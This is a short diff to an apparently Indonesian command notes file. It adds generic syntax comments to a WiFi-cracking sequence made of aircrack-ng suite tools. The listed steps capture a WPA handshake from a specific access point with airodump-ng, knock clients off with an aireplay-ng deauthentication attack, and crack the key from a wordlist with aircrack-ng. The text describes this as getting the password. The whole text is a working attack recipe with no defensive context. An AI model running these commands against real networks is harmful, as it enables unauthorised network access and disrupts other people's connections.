@@ -17,10 +17,13 @@ COMMAND PENGGUNAAN (tools) :
   |__ scan detail lalu lintas jaringan wifi sekitar
 
 - $ sudo airodump-ng --channel 2 --bssid 40:45:DA:06:C1:D9 --write keyfind.txt wlan0mon
+  #  airodump-ng -c [channel] --bssid [bssid] -w [/path/folder/save/] [interface_name]
   |__ monitor for get handshake key encryption
 
 - $ sudo aireplay-ng --deauth 50 -a 40:45:DA:06:C1:D9 wlan0mon
+  # airplay-ng -0 2 -a [bssid] -c [mac_addr_user] [interface]
   |__ attack for restart authentication
 
 - $ aircrack-ng keyfind-01.cap -w ~/filewordlist.txt
+  # aircrack-ng -a2 -b [bssid] -w /path/file/wordlist /path/file/handshake
   |__ hack for get key password
